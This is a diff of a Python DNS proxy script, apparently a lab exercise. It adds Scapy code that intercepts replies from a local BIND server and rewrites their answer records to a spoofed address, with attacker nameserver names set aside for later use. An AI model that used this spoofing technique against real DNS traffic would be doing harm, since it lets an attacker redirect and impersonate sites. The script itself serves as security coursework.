@@ -1,12 +1,20 @@
 #!/usr/bin/env python
 import argparse
 import socket
-# from scapy.all import *
+from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, DNSRRNSEC
+
+
+SPROOF_ADDR = "5.6.6.8"
+SPROOF_NS_1 = "ns1.dnsattacker.net"
+SPROOF_NS_2 = "ns2.dnsattacker.net"
+
+DNS_HOSTS = {
+    b"example.com.": "5.6.6.8",
+}
 
 # This is going to Proxy in front of the Bind Server
 # bind_server_ip = '127.0.0.1'
 # bind_server_port = 1053
-
 
 parser = argparse.ArgumentParser()
 parser.add_argument(
@@ -22,13 +30,14 @@ HOST = "127.0.0.1"
 PORT = args.port # defailt 8087
 # BIND's port
 DNS_ADDR = "127.0.0.1"
-DNS_PORT = args.dns_port # we set to 5050
+DNS_PORT = args.dns_port # we set to 6060
 # Flag to indicate if the proxy should spoof responses
 SPOOF = args.spoof_response
 
 print(PORT)
 print(DNS_PORT)
 print(SPOOF)
+
 
 def forward_to_dns(data, serv, dig_addr, dig_port):
     # new packet = scapy create packet with data, host, port
@@ -37,18 +46,42 @@ def forward_to_dns(data, serv, dig_addr, dig_port):
 
     client.sendto(data, (DNS_ADDR, DNS_PORT))
 
+    # DNS Answers
     response_data = ""
     while True:
         try:
-            response_data, (response_addr, response_port) = client.recvfrom(4096)
+            response_packet = client.recvfrom(4096)
+            response_data, (response_addr, response_port) = response_packet
         except:
             break
         if not response_data:
             break
-        print("response_data", response_data)
+        
         print("response_addr", response_addr)
         print("response_port", response_port)
-        serv.sendto(response_data, (dig_addr, dig_port))
+        print("response_data", response_data)
+        dns_pkt = DNS(response_data)
+
+        domain_name = dns_pkt[DNSQR].qname
+        print("domain name", domain_name)
+        # modify dns response addr
+        dns_pkt[DNS].an = DNSRR(rrname=domain_name, rdata=DNS_HOSTS[domain_name])
+        dns_pkt[DNS].ancount = 1
+        # modify dns response nameserver
+        # dns_pkt[DNS].ns = DNSRRNSEC(rrname=SPROOF_NS_1)
+        # delete additional section
+        dns_pkt[DNS].arcount = 0 
+
+        # response_data = response_data[:len(response_data) // 2]
+        # packet = scapy.packet.Packet()
+        # packet.add_payload(response_data)
+        # print(response_data.decode("ASCII"))
+
+        # packet = IP(saddr, daddr)/UDP(sport, pport)/ DNS(id=pkt[DNS].id, qr=1, qd=DNSQR(qname=pkt[DNSQR].qname), \
+        #                         an=DNSRR(rrname="example.com", rdata = local_ip))
+
+        # response_data["ipv4 address"] = "ns2.utoronto.ca"
+        serv.sendto(bytes(dns_pkt), (dig_addr, dig_port))
     client.close()
 
 
@@ -63,9 +96,10 @@ while True:
         print("data", data)
         print("addr", addr)
         print("port", port)
+
         forward_to_dns(data, serv, addr, port)
 
     serv.close()
     print('client disconnected')
 
-
+#packet = IP()/UDP(daddr, saddr. dport, spport, payload=ourpayload)
